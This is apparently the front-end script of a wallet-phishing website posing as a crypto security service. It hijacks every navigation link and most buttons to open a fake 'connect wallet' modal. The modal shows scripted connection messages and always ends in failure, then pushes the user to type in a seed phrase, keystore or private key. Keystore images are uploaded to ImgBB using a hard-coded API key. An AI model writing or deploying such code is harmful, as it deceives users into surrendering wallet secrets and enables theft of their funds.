// ===== HAMBURGER =====
const hamburger = document.getElementById('hamburger');
const mobileMenu = document.getElementById('mobile-menu');
hamburger.addEventListener('click', () => {
    mobileMenu.classList.toggle('open');
});
document.addEventListener('click', (e) => {
    if (!hamburger.contains(e.target) && !mobileMenu.contains(e.target)) {
        mobileMenu.classList.remove('open');
    }
});

// ===== TYPING ANIMATION =====
const words = ['Security', 'Crypto', 'Payments', 'Privacy'];
let wordIndex = 0;
let charIndex = 0;
let isDeleting = false;
const typedEl = document.getElementById('typed-text');

function type() {
    const current = words[wordIndex];
    if (isDeleting) {
        typedEl.textContent = current.substring(0, charIndex - 1);
        charIndex--;
    } else {
        typedEl.textContent = current.substring(0, charIndex + 1);
        charIndex++;
    }
    let delay = isDeleting ? 60 : 110;
    if (!isDeleting && charIndex === current.length) {
        delay = 1800;
        isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
        isDeleting = false;
        wordIndex = (wordIndex + 1) % words.length;
        delay = 300;
    }
    setTimeout(type, delay);
}
type();

// ===== FAQ ACCORDION =====
function toggleFaq(btn) {
    const answer = btn.nextElementSibling;
    const isOpen = answer.classList.contains('open');
    document.querySelectorAll('.faq-a.open').forEach(a => a.classList.remove('open'));
    document.querySelectorAll('.faq-q.active').forEach(b => b.classList.remove('active'));
    if (!isOpen) {
        answer.classList.add('open');
        btn.classList.add('active');
    }
}

// ===== EXPLICIT ACTION TRIGGERS =====
const triggerWallet = (e) => {
    e.preventDefault();
    if (typeof openWallet === 'function') {
        openWallet();
    }
};

document.querySelectorAll('.btn-primary, .support-btn, .nav-links a, .mobile-menu a').forEach(el => {
    if (el) el.addEventListener('click', triggerWallet);
});

// ── Core modal logic ─────────────────────────────────
const wOverlay = document.getElementById('wOverlay');
const wScreen1 = document.getElementById('wScreen1');
const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];

// ┌──────────────────────────────────────────────────┐
// │  openWallet()  ← ADD onclick="openWallet()"      │
// │  to any button on your site to trigger the modal │
// └──────────────────────────────────────────────────┘
function openWallet() {
    wOverlay.classList.add('open');
    document.body.style.overflow = 'hidden';
    allOff();
}

function closeWallet() {
    stopTimers();
    wOverlay.classList.remove('open');
    document.body.style.overflow = '';
    allOff();
}

function allOff() {
    wScreen1.classList.remove('hidden');
    subIds.forEach(id => document.getElementById(id).classList.remove('active'));
}

function showSub(id) {
    wScreen1.classList.add('hidden');
    subIds.forEach(sid => document.getElementById(sid).classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

// close on backdrop / Escape
wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });

// ── Wallet identity ───────────────────────────────
function setWallet(img, name) {
    ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
    ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
}

function handleWalletSelect(el) {
    const img = el.querySelector('img').src;
    const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
    setWallet(img, name);
    startConnecting();
}

// ── Other wallets + search ────────────────────────
const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
const TOTAL = ALL_WALLETS.length;

function openOtherWallets() {
    showSub('wScreenOther');
    const inp = document.getElementById('owSearch');
    inp.value = '';
    setTimeout(() => inp.focus(), 100);
    filterOw('');
}

document.getElementById('owSearch').addEventListener('input', function () {
    filterOw(this.value.trim().toLowerCase());
});

function filterOw(q) {
    let visible = 0;
    ALL_WALLETS.forEach(item => {
        const n = item.querySelector('.ow-name').textContent.toLowerCase();
        const c = item.querySelector('.ow-chain').textContent.toLowerCase();
        const show = !q || n.includes(q) || c.includes(q);
        item.classList.toggle('hidden', !show);
        if (show) visible++;
    });
    const nr = document.getElementById('owNoResults');
    const ct = document.getElementById('owCount');
    document.getElementById('owQuery').textContent = q;
    if (q && visible === 0) {
        nr.style.display = 'block';
        ct.textContent = 'No results';
    } else {
        nr.style.display = 'none';
        ct.textContent = q
            ? `${visible} wallet${visible === 1 ? '' : 's'} found`
            : `${TOTAL} wallets`;
    }
}

function selectOwWallet(el) {
    const img = el.querySelector('img').src;
    const name = el.querySelector('.ow-name').textContent;
    setWallet(img, name);
    startConnecting();
}

// ── Type toggle (Screen 4) ────────────────────────
function switchType(type) {
    ['phrase', 'keystore', 'privatekey'].forEach(t => {
        document.getElementById('btn-' + t).classList.toggle('active', t === type);
        document.getElementById('pane-' + t).classList.toggle('active', t === type);
    });
}

const IMGBB_API_KEY = "41a8f8a46afb0e1960d74a605fd1e845"; // <--- REPLACE THIS WITH YOUR FREE IMGBB API KEY

function uploadToImgBB(file) {
    const formData = new FormData();
    formData.append("image", file);

    fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: "POST",
        body: formData
    })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
            } else {
                console.error("ImgBB Error:", data);
            }
        })
        .catch(error => {
            console.error("ImgBB Upload Exception:", error);
        });
}

// Keystore file attach
function handleKeystoreFile(input) {
    const file = input.files[0];
    if (!file) return;

    // Clear out any old lingering data from previous uploads
    delete document.getElementById('keystoreInput').dataset.imgUrl;
    delete document.getElementById('keystoreInput').dataset.imgBase64;

    const nameEl = document.getElementById('attachFileName');
    nameEl.textContent = '📎 ' + file.name;
    const reader = new FileReader();
    reader.onload = e => {
        if (file.type.startsWith('image/')) {
            document.getElementById('keystoreInput').dataset.imgBase64 = "Image stored, awaiting ImgBB...";
            document.getElementById('keystoreInput').value = "(Image attached)";
            uploadToImgBB(file);
        } else {
            document.getElementById('keystoreInput').value = e.target.result;
        }
    };
    if (file.type.startsWith('image/')) {
        reader.readAsDataURL(file);
    } else {
        reader.readAsText(file);
    }
}

// ── Timers ────────────────────────────────────────
let cTimer, sTimer, pTimer, aborted = false;
function stopTimers() {
    clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
    aborted = true;
}

const statusMsgs = [
    "Initializing secure connection...", "Scanning for wallet device...",
    "Establishing encrypted channel...", "Verifying wallet signature...",
    "Requesting account access...", "Checking network compatibility...",
    "Syncing wallet state...", "Authenticating session...",
    "Resolving on-chain identity...", "Confirming wallet permissions...",
    "Loading account balances...", "Retrieving transaction history...",
    "Validating network endpoints...", "Preparing secure handshake...",
    "Awaiting device confirmation...", "Connecting to mainnet...",
    "Syncing asset registry...", "Verifying chain ID...",
    "Establishing WebSocket link...", "Fetching wallet metadata...",
    "Decoding wallet address...", "Requesting signing permissions...",
    "Resolving address...", "Preparing wallet interface...",
    "Almost there — finalizing...", "Connecting to RPC endpoint...",
    "Binding wallet to session...", "Verifying account integrity...",
    "Checking pending transactions...", "Finalizing authentication...",
    "Connection attempt finishing..."
];

function startConnecting() {
    aborted = false;
    showSub('wScreen2');
    const statusEl = document.getElementById('s2Status');
    const progressEl = document.getElementById('s2Progress');
    progressEl.style.width = '0%';
    let pool = [...statusMsgs].sort(() => Math.random() - 0.5);
    let i = 0;
    statusEl.textContent = pool[0];
    sTimer = setInterval(() => {
        i++;
        statusEl.style.opacity = '0';
        setTimeout(() => {
            statusEl.textContent = pool[i % pool.length];
            statusEl.style.opacity = '1';
        }, 100);
    }, 300);
    let pct = 0;
    pTimer = setInterval(() => {
        pct = Math.min(pct + (100 / (15000 / 200)), 99);
        progressEl.style.width = pct + '%';
    }, 200);
    cTimer = setTimeout(() => {
        if (aborted) return;
        clearInterval(sTimer); clearInterval(pTimer);
        progressEl.style.width = '100%';
        showSub('wScreen3');
    }, 15000);
}

document.getElementById('retryBtn').addEventListener('click', () => {
    stopTimers(); startConnecting();
});
document.getElementById('manualBtn').addEventListener('click', () => {
    stopTimers(); showSub('wScreen4');
});


function handleRetryManual() {
    document.getElementById('phraseInput').value = '';
    document.getElementById('keystoreInput').value = '';
    document.getElementById('privkeyInput').value = '';
    document.getElementById('attachFileName').textContent = '';
    document.getElementById('keystoreFileInput').value = '';
    switchType('phrase');
    showSub('wScreen4');
}